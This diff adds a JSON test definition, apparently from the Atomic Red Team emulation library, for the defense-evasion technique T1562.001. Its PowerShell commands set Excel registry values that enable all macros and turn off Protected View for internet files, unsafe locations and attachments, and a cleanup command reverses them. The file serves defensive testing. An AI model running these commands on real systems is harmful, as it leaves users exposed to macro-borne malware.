@@ -1,0 +1,24 @@
+{
+    "name": "Disable Microsoft Office Security Features",
+    "description": "Gorgon group may disable Office security features so that their code can run. Upon execution, an external document will not show any warning before editing the document.   https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/ ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableInternetFilesInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableUnsafeLocationsInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableAttachementsInPV\" -Value \"1\" -PropertyType \"Dword\"\n",
+        "cleanup_command": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -ErrorAction Ignore | Out-Null\nRemove-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -ErrorAction Ignore\n",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1562.001",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "Disable or Modify Tools",
+    "source": "ART",
+    "uuid": "6f5fb61b-4e56-4a3d-a8c3-82e13686c6d7",
+    "arguments": null,
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
